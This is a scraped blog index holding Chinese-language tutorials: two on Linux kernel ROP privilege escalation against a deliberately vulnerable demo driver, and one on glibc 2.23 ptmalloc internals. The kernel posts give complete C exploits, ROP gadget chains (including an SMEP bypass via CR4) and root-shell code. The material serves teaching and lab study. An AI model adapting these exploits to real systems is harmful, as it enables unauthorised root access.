直接指向用户态提权代码,实现进程提权 ","date":"2020-01-06","objectID":"/kernel_rop2/:1:0","tags":["linux kernel","rop","exp"],"title":"linux 内核提权总结(demo+exp分析) -- ROP(二)","uri":"/kernel_rop2/"},{"categories":["linux内核态漏洞利用"],"content":"一. 判断是否开启smep 查看 boot.sh qemu-system-x86_64 \\ -kernel bzImage \\ -initrd rootfs.img \\ -append \"console=ttyS0 root=/dev/ram rdinit=/sbin/init\" \\ -cpu qemu64,+smep,+smap \\ -nographic \\ -gdb tcp::1234 smep, smap 在boot.sh -cpu选项内进行设置 ","date":"2020-01-06","objectID":"/kernel_rop2/:1:1","tags":["linux kernel","rop","exp"],"title":"linux 内核提权总结(demo+exp分析) -- ROP(二)","uri":"/kernel_rop2/"},{"categories":["linux内核态漏洞利用"],"content":"二. ROP链构造 ROP[i++] = 0xffffffff810275f1 + offset; //pop rax; ret ROP[i++] = 0x6f0; ROP[i++] = 0xffffffff8123ed93 + offset; //pop rcx; ret ROP[i++] = 0; ROP[i++] = 0xffffffff81003c0e + offset; //mov cr4, rax ; push rcx ; popfq ; pop rbp ; ret ROP[i++] = 0; ROP[i++] = (size_t)get_root; ","date":"2020-01-06","objectID":"/kernel_rop2/:1:2","tags":["linux kernel","rop","exp"],"title":"linux 内核提权总结(demo+exp分析) -- ROP(二)","uri":"/kernel_rop2/"},{"categories":["linux内核态漏洞利用"],"content":"三. exp // gcc ret2usr.c -masm=intel -static -o ret2usr #include \u003cfcntl.h\u003e#include \u003cunistd.h\u003e#include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e size_t base, commit_creds, prepare_kernel_cred; size_t user_cs, user_ss, user_rflags, user_sp, shell; void get_shell() { if (!getuid()) { puts(\"=.=\"); system(\"/bin/sh\"); } else { puts(\"failed\"); } exit(0); } void get_root() { char *(*pkc)(int) = prepare_kernel_cred; void (*cc)(char *) = commit_creds; (*cc)((*pkc)(0)); asm( \"pushq user_ss;\" \"pushq user_sp;\" \"pushq user_rflags;\" \"pushq user_cs;\" \"push shell;\" \"swapgs;\" \"iretq;\"); } void save_status() { __asm__(\"mov user_cs, cs;\" \"mov user_ss, ss;\" \"mov user_sp, rsp;\" \"pushf;\" \"pop user_rflags;\"); shell = (size_t)get_shell; printf(\"ip is 0x%lx\\n\", (size_t)get_shell); printf(\"cs is 0x%lx\\n\", user_cs); printf(\"ss is 0x%lx\\n\", user_ss); printf(\"sp is 0x%lx\\n\", user_sp); printf(\"flag is 0x%lx\\n\", user_rflags); puts(\"status has been saved.\"); } size_t get_addr(char *name) { int num = strlen(name) * 2 + 3 + 27; char cmd[num]; memset(cmd, 0, num); strcat(cmd, \"cat /tmp/kallsyms | grep \"); strcat(cmd, name); strcat(cmd, \" \u003e \"); strcat(cmd, name); printf(\"the cmd is %s\\n\", cmd); system(cmd); char buf[19] = {0}; size_t addr = 0; FILE *fp = fopen(name, \"r\"); if (fp == NULL) { printf(\"open %s error!\\n\", name); exit(0); } fgets(buf, 18, fp); addr = strtoul(buf, 0, 16); printf(\"the addr(0x) is: %p\\n\", (void *)addr); if (addr == 0) { puts(\"string conversion integer failed\"); } fclose(fp); return addr; } size_t get_canary() { system(\"dmesg | grep canary \u003e canary\"); puts(\"the cmd is: dmesg | grep canary \u003e canary\"); FILE *fp = fopen(\"canary\", \"r\"); if (fp == NULL) { puts(\"open canary error\"); exit(0); } char buf[100] = {0}; size_t canary = 0; fgets(buf, 100, fp); char *str_canary = strstr(buf, \"0x\"); canary = strtoul(str_canary, 0, 16); fclose(fp); printf(\"the canary is 0x%lx\\n\", canary); return canary; } char *rop(size_t offset, size_t *ROP) { int i = 0; ROP[i++] = 0xffffffff810275f1 + offset; //pop rax; ret ROP[i++] = 0x6f0; ROP[i++] = 0xffffffff8123ed93 + offset; //pop rcx; ret ROP[i++] = 0; ROP[i++] = 0xffffffff81003c0e + offset; //mov cr4, rax ; push rcx ; popfq ; pop rbp ; ret ROP[i++] = 0; ROP[i++] = (size_t)get_root; } int main() { base = get_addr(\"startup_64\"); commit_creds = get_addr(\"commit_creds\"); prepare_kernel_cred = get_addr(\"prepare_kernel_cred\"); size_t offset = base - 0xffffffff81000000; printf(\"offset is: %lx\\n\", offset); int fd = open(\"/dev/rop_dev\", 2); if (0 == fd) { puts(\"open /dev/rop_dev error\"); exit(0); } char payload1[0x10] = {0}; write(fd, payload1, 0x10); write(fd, payload1, 0x10); size_t canary = get_canary(); size_t payload2[19] = {0}; payload2[0] = 0x6161616161616161; payload2[1] = 0x6262626262626262; payload2[2] = canary; payload2[3] = 0x6363636363636363; save_status(); rop(offset, \u0026payload2[4]); write(fd, payload2, 8 * 19); return 0; } ","date":"2020-01-06","objectID":"/kernel_rop2/:1:3","tags":["linux kernel","rop","exp"],"title":"linux 内核提权总结(demo+exp分析) -- ROP(二)","uri":"/kernel_rop2/"},{"categories":["linux内核态漏洞利用"],"content":"发表于看雪论坛 ","date":"2020-01-01","objectID":"/kernel_rop1/:0:0","tags":["linux kernel","rop","exp"],"title":"linux 内核提权总结(demo+exp分析) -- ROP(一)","uri":"/kernel_rop1/"},{"categories":["linux内核态漏洞利用"],"content":"基础ROP篇(linux 5.0.21) 内核提权与用户态攻击的区别 攻击流程 用户态攻击: 执行 system(\"/bin/sh\") 获得shell 内核提权: 内核执行 commit_creds(prepare_kernel_cred(0)) 使进程获得root权限 用户态进程执行system(\"/bin/sh\") 获得root权限 shell 理解难点 内核rop链构造 用户态进程与内核之间的切换 ","date":"2020-01-01","objectID":"/kernel_rop1/:1:0","tags":["linux kernel","rop","exp"],"title":"linux 内核提权总结(demo+exp分析) -- ROP(一)","uri":"/kernel_rop1/"},{"categories":["linux内核态漏洞利用"],"content":"一. 漏洞分析 (建议初学者先了解基础的驱动程序知识) 查看驱动安全机制 checksec rop.ko [*] '/home/povcfe/linux/flod/rop.ko' Arch: amd64-64-little RELRO: No RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x0) 发现开启canary和NX 查看qemu启动脚本boot.sh boot.sh qemu-system-x86_64 \\ -kernel bzImage \\ -initrd rootfs.img \\ -append \"console=ttyS0 root=/dev/ram rdinit=/sbin/init\" \\ -cpu qemu64 \\ -nographic \\ -gdb tcp::1234 查看开机自启脚本 rcS #!/bin/sh mount -t proc none /proc mount -t sysfs none /sys echo /sbin/mdev \u003e /proc/sys/kernel/hotplug # 支持热拔插 /sbin/mdev -s cat /proc/kallsyms \u003e /tmp/kallsyms # 当/proc/sys/kernel/kptr_restrict=1时，普通用户不能通过/proc/kallsyms读取函数地址，为减少难度直接将kallsyms内容写入临时目录 insmod rop.ko # 目标驱动 chmod 777 /dev/povcfe_dev chmod 777 /dev/rop_dev setsid cttyhack setuidgid 1000 sh 审计代码，可以发现dangerous函数存在明显的栈溢出漏洞(降低难度直接泄漏canary) void dangerous(size_t num) { char overflow[0x10] = {0}; printk(KERN_INFO \"canary is 0x%lx\", *((size_t *)overflow + 2)); memcpy(overflow, kernel_buf, num); printk(KERN_INFO \"%s\", overflow); } 利用思路 Canary通过printk泄露 NX使用rop绕过 读取 /tmp/kallsyms的startup_64(获得内核代码加载基地址，用于定位ROPgadget在内存中的真实地址) 读取 /tmp/kallsyms的commit_creds, prepare_kernel_cred，获得目标内核函数地址 ","date":"2020-01-01","objectID":"/kernel_rop1/:1:1","tags":["linux kernel","rop","exp"],"title":"linux 内核提权总结(demo+exp分析) -- ROP(一)","uri":"/kernel_rop1/"},{"categories":["linux内核态漏洞利用"],"content":"二. ROP链构造 内核执行commit_creds(prepare_kernel_cred(0)) 通过/tmp/kallsyms获得 commit_creds() prepare_kernel_cred() 函数地址 执行 cat tmp/kallsyms | grep startup_64, 如果startup_64不等于0xffffffff81000000, 即内核开启kalsr防护, startup_64与0xffffffff81000000 的差值即为内核基地址偏移(很多发行版默认不打开kalsr, 利用就比较简单了) 利用ROPgadget获得vmlinux的所有gadget片段(如果效果不理想可换用ropper) ROPgadget --binary vmlinux \u003e rop_gadget 根据所需在rop_gadget中搜索(因为程序开启kalsr，所以 真实地址 = rop_gadget地址 + 基地址偏移) 返回用户态 进入内核前，保存用户态数据 size_t user_cs, user_ss, user_rflags, user_sp; void save_status() { __asm__(\"mov user_cs, cs;\" \"mov user_ss, ss;\" \"mov user_sp, rsp;\" \"pushf;\" \"pop user_rflags;\" ); } 内核切换到用户态 执行swapg 恢复GS值(GS通过宏实现, 并不保存在gs寄存器) 执行iretq 恢复用户态数据(或者执行sysretq 只需提供rip) 需要提前在栈上填充用户态数据(rip,cs,rflags,sp,ss) 填充的用户态数据应在用户态切换到内核态前保存(内联汇编) ROP 链构造 commit_creds() 接收 prepare_kernel_cred(0)的返回值作为参数，即rdi \u003c- rax 时需要灵活变通(手动搜索rop_gadget文件) ROP[i++] = 0xffffffff8106b910 + offset; // pop rdi, ret ROP[i++] = 0x0; ROP[i++] = prepare_kernel_cred; ROP[i++] = 0xffffffff8105bd21 + offset; // test rcx,rcx ; jne 0xffffffff8105bcc6 ; pop rbp ; ret ROP[i++] = 0x0; ROP[i++] = 0xffffffff8110c68a + offset; // mov rdi, rax ; jne 0xffffffff8110c672 ; pop rbp ; ret ROP[i++] = 0x0; ROP[i++] = commit_creds; ROP[i++] = 0xffffffff81a00d5e + offset; // swapgs ; popfq ; pop rbp ; ret ROP[i++] = 0x0; ROP[i++] = 0x0; ROP[i++] = 0xffffffff81024b3b + offset; // iretq ROP[i++] = (size_t)get_shell; // rip ROP[i++] = user_cs; ROP[i++] = user_rflags; ROP[i++] = user_sp; ROP[i++] = user_ss; ","date":"2020-01-01","objectID":"/kernel_rop1/:1:2","tags":["linux kernel","rop","exp"],"title":"linux 内核提权总结(demo+exp分析) -- ROP(一)","uri":"/kernel_rop1/"},{"categories":["linux内核态漏洞利用"],"content":"三. 结果展示 ","date":"2020-01-01","objectID":"/kernel_rop1/:1:3","tags":["linux kernel","rop","exp"],"title":"linux 内核提权总结(demo+exp分析) -- ROP(一)","uri":"/kernel_rop1/"},{"categories":["linux内核态漏洞利用"],"content":"四. exp // gcc rop.c -masm=intel -static -o rop #include \u003cfcntl.h\u003e#include \u003cunistd.h\u003e#include \u003cstdio.h\u003e#include \u003cstdlib.h\u003e#include \u003cstring.h\u003e void get_shell() { if (!getuid()) { puts(\"=.=\"); system(\"/bin/sh\"); } else { puts(\"failed\"); } exit(0); } size_t user_cs, user_ss, user_rflags, user_sp; void save_status() { __asm__(\"mov user_cs, cs;\" \"mov user_ss, ss;\" \"mov user_sp, rsp;\" \"pushf;\" \"pop user_rflags;\"); printf(\"ip is 0x%lx\\n\", (size_t)get_shell); printf(\"cs is 0x%lx\\n\", user_cs); printf(\"ss is 0x%lx\\n\", user_ss); printf(\"sp is 0x%lx\\n\", user_sp); printf(\"flag is 0x%lx\\n\", user_rflags); puts(\"status has been saved.\"); } size_t get_addr(char *name) { int num = strlen(name) * 2 + 3 + 27; char cmd[num]; memset(cmd, 0, num); strcat(cmd, \"cat /tmp/kallsyms | grep \"); strcat(cmd, name); strcat(cmd, \" \u003e \"); strcat(cmd, name); printf(\"the cmd is %s\\n\", cmd); system(cmd); char buf[19] = {0}; size_t addr = 0; FILE *fp = fopen(name, \"r\"); if (fp == NULL) { printf(\"open %s error!\\n\", name); exit(0); } fgets(buf, 18, fp); addr = strtoul(buf, 0, 16); printf(\"the addr(0x) is: %p\\n\", (void *)addr); if (addr == 0) { puts(\"string conversion integer failed\"); } fclose(fp); return addr; } size_t get_canary() { system(\"dmesg | grep canary \u003e canary\"); puts(\"the cmd is: dmesg | grep canary \u003e canary\"); FILE *fp = fopen(\"canary\", \"r\"); if (fp == NULL) { puts(\"open canary error\"); exit(0); } char buf[100] = {0}; size_t canary = 0; fgets(buf, 100, fp); puts(buf); char *str_canary = strstr(buf, \"0x\"); puts(str_canary); canary = strtoul(str_canary, 0, 16); fclose(fp); printf(\"the canary is 0x%lx\\n\", canary); return canary; } char *rop(size_t offset, size_t *ROP, size_t commit_creds, size_t prepare_kernel_cred) { int i = 0; ROP[i++] = 0xffffffff8106b910 + offset; // pop rdi, ret ROP[i++] = 0x0; ROP[i++] = prepare_kernel_cred; ROP[i++] = 0xffffffff8105bd21 + offset; // test rcx,rcx ; jne 0xffffffff8105bcc6 ; pop rbp ; ret ROP[i++] = 0x0; ROP[i++] = 0xffffffff8110c68a + offset; // mov rdi, rax ; jne 0xffffffff8110c672 ; pop rbp ; ret ROP[i++] = 0x0; ROP[i++] = commit_creds; ROP[i++] = 0xffffffff81a00d5e + offset; // swapgs ; popfq ; pop rbp ; ret ROP[i++] = 0x0; ROP[i++] = 0x0; ROP[i++] = 0xffffffff81024b3b + offset; // iretq ROP[i++] = (size_t)get_shell; // rip ROP[i++] = user_cs; ROP[i++] = user_rflags; ROP[i++] = user_sp; ROP[i++] = user_ss; } int main() { size_t base, commit_creds, prepare_kernel_cred; base = get_addr(\"startup_64\"); commit_creds = get_addr(\"commit_creds\"); prepare_kernel_cred = get_addr(\"prepare_kernel_cred\"); size_t offset = base - 0xffffffff81000000; printf(\"offset 0x%lx\\n\", offset); int fd = open(\"/dev/rop_dev\", 2); if (0 == fd) { puts(\"open /dev/rop_dev error\"); exit(0); } char payload1[0x10] = {0}; write(fd, payload1, 0x10); write(fd, payload1, 0x10); size_t canary = get_canary(); size_t payload2[17] = {0}; payload2[0] = 0x6161616161616161; payload2[1] = 0x6262626262626262; payload2[2] = canary; payload2[3] = 0x6363636363636363; save_status(); rop(offset, \u0026payload2[4], commit_creds, prepare_kernel_cred); write(fd, payload2, 8*21); puts(\"success\"); return 0; } ","date":"2020-01-01","objectID":"/kernel_rop1/:1:4","tags":["linux kernel","rop","exp"],"title":"linux 内核提权总结(demo+exp分析) -- ROP(一)","uri":"/kernel_rop1/"},{"categories":["linux内核态漏洞利用"],"content":"五. 踩坑记录 高版本linux canary存在\\x00截断(低版本没有) 使用ROPgadget获得的gadget片段有可能存在于vmlinux的数据区 (不管是代码还是数据在内存中都只是一堆二进制数字), 所以如果内核开启NX保护, 那么内核数据区的gadget就不能用于ROP链构造 使用iretq从内核态切换至用户态时，出现段错误(用户态数据被正常还原) 解决方案: 将qemu的cpu启动参数由kvm64切换为qemu64 ROPgadget 获得的代码片段中没有iretq和sysretq 原因：ROPgadget工具获得的代码片段作用于程序流程控制，即ret, call 等元素必须存在，但是内核态返回用户态只需执行 iretq指令，与其后接的汇编无关，由此看来，使用ROPgadget工具获得的内容是少于需求的，所以有可能iretq,sysretq, 不存在于获得的代码片段中 解决方案： python 进行iretq编码匹配 ida 解析vmlinux 查找iretq指令 ","date":"2020-01-01","objectID":"/kernel_rop1/:1:5","tags":["linux kernel","rop","exp"],"title":"linux 内核提权总结(demo+exp分析) -- ROP(一)","uri":"/kernel_rop1/"},{"categories":["linux用户态源码分析"],"content":"发表于看雪论坛 linux用户态下的堆溢出利用即是对ptmalloc2安全机制的绕过，只有深入的了解ptmalloc，才能进行精准的堆溢出攻击 ","date":"2019-10-06","objectID":"/ptmalloc/:0:0","tags":["linux","ptmalloc","heap"],"title":"glibc2.23 ptmalloc 原理概述","uri":"/ptmalloc/"},{"categories":["linux用户态源码分析"],"content":"malloc ","date":"2019-10-06","objectID":"/ptmalloc/:1:0","tags":["linux","ptmalloc","heap"],"title":"glibc2.23 ptmalloc 原理概述","uri":"/ptmalloc/"},{"categories":["linux用户态源码分析"],"content":"__libc_malloc(传入参数:size) 判断 是否定义hook函数 ，如果存在则调用hook函数，否则跳到2 void *(*hook) (size_t, const void *) = atomic_forced_read (__malloc_hook); if (__builtin_expect (hook != NULL, 0)) return (*hook)(bytes, RETURN_ADDRESS (0)); 执行arena_get得到空闲分配区 arena_get (ar_ptr, bytes); 调用_int_malloc()获得内存地址 victim = _int_malloc (ar_ptr, bytes); 如果分配失败，ptmalloc会尝试再去寻找一个可用的arena并进行内存分配 if (!victim \u0026\u0026 ar_ptr != NULL) { LIBC_PROBE (memory_malloc_retry, 1, bytes); ar_ptr = arena_get_retry (ar_ptr, bytes); victim = _int_malloc (ar_ptr, bytes); } 得到内存地址后解锁分配区 if (ar_ptr != NULL) (void) mutex_unlock (\u0026ar_ptr-\u003emutex); 如果在上面的步骤中获得非mmap得到的chunk，但是chunk对应的分配区与实际的分配区不相符，则程序终止 assert (!victim || chunk_is_mmapped (mem2chunk (victim)) || ar_ptr == arena_for_chunk (mem2chunk (victim))); ","date":"2019-10-06","objectID":"/ptmalloc/:1:1","tags":["linux","ptmalloc","heap"],"title":"glibc2.23 ptmalloc 原理概述","uri":"/ptmalloc/"},{"categories":["linux用户态源码分析"],"content":"_int_malloc errout: 打印错误字符串并 return 判断 size是否大于(unsigned long)(-2*MINSIZE) MINSIZE=chunk的最小大小 ，如果是则return，否则将size转换为chunk_size #define checked_request2size(req, sz) \\ if (REQUEST_OUT_OF_RANGE (req)) { \\ __set_errno (ENOMEM); \\ return 0; \\ } \\ (sz) = request2size (req); 判断 前面是否没有获得空闲分配区 如果是则跳到3，否则跳到4 if (__glibc_unlikely (av == NULL)) 调用sysmalloc尝试获得chunk地址，如果得到则调用alloc_perturb 将清理空间数据，return chunk地址 if (__glibc_unlikely (av == NULL)) { void *p = sysmalloc (nb, av); if (p != NULL) alloc_perturb (p, bytes); return p; } (从fastbin中分配chunk) 判断 size是否小于global_max_fast ,如果是跳到5，否则跳到10 if ((unsigned long) (nb) \u003c= (unsigned long) (get_max_fast ())) 根据size获得fastbin索引x，定位当前分配区fastbin if ((unsigned long) (nb) \u003c= (unsigned long) (get_max_fast ())) { idx = fastbin_index (nb); mfastbinptr *fb = \u0026fastbin (av, idx); mchunkptr pp = *fb; 令victim=fastbin ,判断 victim是否等于NULL 如果是则跳到7，否则fastbin =fastbin -\u003efd do { victim = pp; if (victim == NULL) break; } while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-\u003efd, victim)) != victim); 判断 victim是否不等于0 如果是跳到8，否则跳到10 判断 victim_size对应的fastbin索引是否不等于size对应的fastbin索引 ，如果是则goto errout (errstr = “malloc(): memory corruption (fast)\") 否则跳到9 if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) { errstr = \"malloc(): memory corruption (fast)\"; errout: malloc_printerr (check_action, errstr, chunk2mem (victim), av); return NULL; } 将victim chunk指针转换为用户数据区指针，调用alloc_perturb()对用户数据区进行初始化，return void *p = chunk2mem (victim); alloc_perturb (p, bytes); (从smallbin中分配chunk) 判断 size是否在smallbin范围(小于MIN_LARGE_SIZE)内 如果是则跳到11，否则跳到18 if (in_smallbin_range (nb)) 根据size获得smallbin的索引x，定位本分配区的smallbin idx = smallbin_index (nb); bin = bin_at (av, idx); 令victim等于smallbin -\u003ebk,判断 smallbin -\u003ebk是否不等于smallbin (即smallbin是否不为空) 如果是则跳到13，否则跳到18 判断 smallbin -\u003ebk是否等于0 如果是则执行malloc_consolidate进行初始化，否则跳到14 if (victim == 0) /* initialization check */ malloc_consolidate (av); 判断 victim-\u003ebk-\u003efd是否不等于victim 如果是则goto errout (errstr = “malloc(): smallbin double linked list corrupted”) 否则跳到15 bck = victim-\u003ebk; if (__glibc_unlikely (bck-\u003efd != victim)) { errstr = \"malloc(): smallbin double linked list corrupted\"; goto errout; } 设置victim的下一个chunk 标志位为pre_chunk_inuse,将smallbin -\u003ebk从双链表中摘除(smallbin -\u003ebk＝smallbin -\u003ebk-\u003ebk,smallbin -\u003ebk-\u003efd=smallbin ) set_inuse_bit_at_offset (victim, nb); bin-\u003ebk = bck; bck-\u003efd = bin; 如果当前分配区不是main_arena,则设置victim的标志位为NON_MAIN_ARENA if (av != \u0026main_arena) victim-\u003esize |= NON_MAIN_ARENA; 将victim chunk指针转换为用户数据区指针，调用alloc_perturb()对用户数据区进行初始化，return void *p = chunk2mem (victim); alloc_perturb (p, bytes); 根据size获得largebin的索引x idx = largebin_index (nb); 判断当前分配区是否存在fastbin (通过flag标志位)如果是则执行malloc_consolidate合并fastbin if (have_fastchunks (av)) malloc_consolidate (av); (处理unsortedbin) 令victim等于unsortedbin-\u003ebk, (while循环/20-32/ 直至unsortedbin为空) 判断 unsortedbin-\u003ebk是否不等于unsortedbin ，如果是跳到21，否则跳到32 while ((victim = unsorted_chunks (av)-\u003ebk) != unsorted_chunks (av)) 判断 victim_size是否小于等于2*SIZE_SZ或者victim_size是否大于system_mem ,如果是则打印错误 (“malloc(): memory corruption”) 并退出，否则跳到22 if (__builtin_expect (victim-\u003esize \u003c= 2 * SIZE_SZ, 0) || __builtin_expect (victim-\u003esize \u003e av-\u003esystem_mem, 0)) malloc_printerr (check_action, \"malloc(): memory corruption\", chunk2mem (victim), av); 判断 size是否在smallbin范围内并且victim-\u003ebk是否等于unsortedbin(即unsorted bin 是否只存在一个chunk)并且unsortedbin的当前chunk是否为last_remainder并且victim_size是否大于(nb+MINSIZE) 如果是则切割chunk并产生last_remainder,否则跳到25 if (in_smallbin_range (nb) \u0026\u0026 bck == unsorted_chunks (av) \u0026\u0026 victim == av-\u003elast_remainder \u0026\u0026 (unsigned long) (size) \u003e (unsigned long) (nb + MINSIZE)) { /* split and reattach remainder */ remainder_size = size - nb; remainder = chunk_at_offset (victim, nb); unsorted_chunks (av)-\u003ebk = unsorted_chunks (av)-\u003efd = remainder; av-\u003elast_remainder = remainder; 如果切割后的last_remainder_size在smallbin范围内，则将新的last_remainder的fd_nextsize和bk_nextsize清零 if (!in_smallbin_range (remainder_size)) { remainder-\u003efd_nextsize = NULL; remainder-\u003ebk_nextsize = NULL; } 设置victim的pre_inuse和main_arena标志位，设置last_r","date":"2019-10-06","objectID":"/ptmalloc/:1:2","tags":["linux","ptmalloc","heap"],"title":"glibc2.23 ptmalloc 原理概述","uri":"/ptmalloc/"},{"categories":["linux用户态源码分析"],"content":"malloc_consolidate 如果max_fast不为0，则清空分配区have_fastbin标志，否则执行malloc_init_state进行初始化 if (get_max_fast () != 0) { clear_fastchunks(av); ... else { malloc_init_state(av); check_malloc_state(av); } 获得unsortedbin，fastbin[0]，fastbin[MAX]地址 maxfb = \u0026fastbin (av, NFASTBINS - 1); fb = \u0026fastbin (av, 0); 遍历fastbin中的所有chunk，对每个chunk做如下操作 获得chunk_size,下一个块的地址与next_chunk_size size = p-\u003esize \u0026 ~(PREV_INUSE|NON_MAIN_ARENA); nextchunk = chunk_at_offset(p, size); nextsize = chunksize(nextchunk); 判断 上一个块是否空闲 如果是则合并chunk，并使用unlink将上一个块从bin中释放，否则跳到6 if (!prev_inuse(p)) { prevsize = p-\u003eprev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); } 判断 下一个块是否不是是top_chunk 如果是则跳到7，否则跳到9 判断 下一个块是否空闲 如果是则合并chunk，并使用unlink将下一个块从bin中释放，否则跳到8 nextinuse = inuse_bit_at_offset(nextchunk, nextsize); if (!nextinuse) { size += nextsize; unlink(av, nextchunk, bck, fwd); } 将chunk插入unsortedbin头部，return unsorted_bin-\u003efd = p; first_unsorted-\u003ebk = p; if (!in_smallbin_range (size)) { p-\u003efd_nextsize = NULL; p-\u003ebk_nextsize = NULL; } set_head(p, size | PREV_INUSE); p-\u003ebk = unsorted_bin; p-\u003efd = first_unsorted; 将chunk与top_chunk合并，return else { size += nextsize; set_head(p, size | PREV_INUSE); av-\u003etop = p; } ","date":"2019-10-06","objectID":"/ptmalloc/:1:3","tags":["linux","ptmalloc","heap"],"title":"glibc2.23 ptmalloc 原理概述","uri":"/ptmalloc/"},{"categories":["linux用户态源码分析"],"content":"free ","date":"2019-10-06","objectID":"/ptmalloc/:2:0","tags":["linux","ptmalloc","heap"],"title":"glibc2.23 ptmalloc 原理概述","uri":"/ptmalloc/"},{"categories":["linux用户态源码分析"],"content":"__libc_free(传入参数:待释放指针) 判断 是否定义hook函数 ，如果存在则调用hook函数，否则跳到2 void (*hook) (void *, const void *) = atomic_forced_read (__free_hook); if (__builtin_expect (hook != NULL, 0)) { (*hook)(mem, RETURN_ADDRESS (0)); return; } 判断 传入指针是否为0 ，如果为0(0为无效指针)则return，否则跳到3 if (mem == 0) /* free(0) has no effect */ return; 将传入指针转换为chunk指针 判断 chunk是否是由mmap分配得到 ，如果是则跳到5，否则跳到8 判断 是否没有禁用动态阈值选项且chunk大小是否大于mmap分配阈值且chunk大小是否小于mmap默认最大分配阈值 ，如果是则跳到6，否则跳到7 if (chunk_is_mmapped (p)) /* release mmapped memory. */ { /* see if the dynamic brk/mmap threshold needs adjusting */ if (!mp_.no_dyn_threshold \u0026\u0026 p-\u003esize \u003e mp_.mmap_threshold \u0026\u0026 p-\u003esize \u003c= DEFAULT_MMAP_THRESHOLD_MAX) 设置mmap分配阈值等于chunk_size，top_chunk收缩阈值等于chunk_size*2 { mp_.mmap_threshold = chunksize (p); mp_.trim_threshold = 2 * mp_.mmap_threshold; LIBC_PROBE (memory_mallopt_free_dyn_thresholds, 2, mp_.mmap_threshold, mp_.trim_threshold); } 执行munmap_chunk释放chunk，然后return munmap_chunk (p); return; 获得chunk的分配区，并执行_int_free函数 ar_ptr = arena_for_chunk (p); _int_free (ar_ptr, p, 0); ","date":"2019-10-06","objectID":"/ptmalloc/:2:1","tags":["linux","ptmalloc","heap"],"title":"glibc2.23 ptmalloc 原理概述","uri":"/ptmalloc/"},{"categories":["linux用户态源码分析"],"content":"_int_free(1.分配区指针，2.chunk指针，3.分配区互斥锁) errout: 判断 分配区是否被锁 ，如果是则解锁分配区 打印错误字符串并 return 获得chunk_size size = chunksize (p); 判断 chunk指针是否大于-chunk_size(unsigned)或者chunk指针是否不关于MALOOC_ALIGN_MASK字节对齐 如果是则goto errout errstr = “free(): invalid pointer” if (__builtin_expect ((uintptr_t) p \u003e (uintptr_t) -size, 0) || __builtin_expect (misaligned_chunk (p), 0)) { errstr = \"free(): invalid pointer\"; errout: if (!have_lock \u0026\u0026 locked) (void) mutex_unlock (\u0026av-\u003emutex); malloc_printerr (check_action, errstr, chunk2mem (p), av); return; } 判断 chunk_size是否小于MINSIZE或者chunk_size是否不关于MALOOC_ALIGN_MASK字节对齐 如果是则goto errout (errstr = “free(): invalid size”) if (__glibc_unlikely (size \u003c MINSIZE || !aligned_OK (size))) { errstr = \"free(): invalid size\"; goto errout; } (释放到fastbin) 判断 chunk_size是否小于等于global_max_fast 如果是则跳到5，否则跳到10 if ((unsigned long)(size) \u003c= (unsigned long)(get_max_fast ()) 分配区加锁，判断 分配区是否加锁或者next_chunk_size是否小于等于2*sizeof(INTERNAL_SIZE_T)或者next_chunk_size是否大于等于av-\u003esystem_mem ，如果是则goto errout (errstr = “free(): invalid next size (fast)\" if (have_lock || ({ assert (locked == 0); mutex_lock(\u0026av-\u003emutex); locked = 1; chunk_at_offset (p, size)-\u003esize \u003c= 2 * SIZE_SZ || chunksize (chunk_at_offset (p, size)) \u003e= av-\u003esystem_mem; })) { errstr = \"free(): invalid next size (fast)\"; goto errout; } 解锁分配区，设置分配区flag的has_fastbin比特位为1，根据chunk_size寻找对应fastbins的索引x，根据分配区和索引位置找到chunk对应的\u0026fastbin set_fastchunks(av); unsigned int idx = fastbin_index(size); fb = \u0026fastbin (av, idx); 判断 chunk是否等于fastbin 如果是则goto errout (errstr = “double free or corruption (fasttop)\") if (__builtin_expect (old == p, 0)) { errstr = \"double free or corruption (fasttop)\"; goto errout; } 获得fastbin -\u003esize对应的fastbin索引y，将chunk插入fastbin头部 old_idx = fastbin_index(chunksize(old)); p-\u003efd = old2 = old; 判断 分配区是否加锁且fastbin 是否不为0且x与y是否不相同 如果是，则goto errout (errstr = “invalid fastbin entry (free)\" 否则return if (have_lock \u0026\u0026 old != NULL \u0026\u0026 __builtin_expect (old_idx != idx, 0)) { errstr = \"invalid fastbin entry (free)\"; goto errout; } (释放到unsortedbin) 判断 chunk是否不是mmap函数分配的 如果是则跳到11，否则跳到27 分配区加锁 else if (!chunk_is_mmapped(p)) { if (! have_lock) { (void)mutex_lock(\u0026av-\u003emutex); locked = 1; } 判断 chunk是否是top_chunk 如果是则goto errout (errstr = “double free or corruption (top)\" nextchunk = chunk_at_offset(p, size); /* Lightweight tests: check whether the block is already the top block. */ if (__glibc_unlikely (p == av-\u003etop)) { errstr = \"double free or corruption (top)\"; goto errout; } 判断 分配区是否可以分配连续空间且next_chunk指针是否大于(top_chunk指针+top_chunk_size) 如果是则goto errout (errstr = “double free or corruption (out)\" if (__builtin_expect (contiguous (av) \u0026\u0026 (char *) nextchunk \u003e= ((char *) av-\u003etop + chunksize(av-\u003etop)), 0)) { errstr = \"double free or corruption (out)\"; goto errout; } 判断 next_chunk的pre_inuse标志是否为0 如果是，则goto errout (errstr = “double free or corruption (!prev)\" if (__glibc_unlikely (!prev_inuse(nextchunk))) { errstr = \"double free or corruption (!prev)\"; goto errout; } 判断 next_chunk_size是否小于2*sizeof(size_t)或者next_chunk_size是否大于av-\u003esystem_mem 如果是则goto errout (errstr = “free(): invalid next size (normal)\" nextsize = chunksize(nextchunk); if (__builtin_expect (nextchunk-\u003esize \u003c= 2 * SIZE_SZ, 0) || __builtin_expect (nextsize \u003e= av-\u003esystem_mem, 0)) { errstr = \"free(): invalid next size (normal)\"; goto errout; } 判断 pre_chunk是否是空闲的 如果是则使用unlink取出pre_chunk，使chunk等于pre_chunk if (!prev_inuse(p)) { prevsize = p-\u003eprev_size; size += prevsize; p = chunk_at_offset(p, -((long) prevsize)); unlink(av, p, bck, fwd); } 判断 next_chunk是否等于top_chunk 如果是，则跳到22 判断 next_chunk是否是空闲的 如果是则使用unlink取出next_chunk,否则清空next_chunk的pre_inuse if (!nextinuse) { unlink(av, nextchunk, bck, fwd); size += nextsize; } else clear_inuse_bit_at_offset(nextchunk, 0); 获得unsorted_bin地址 判断 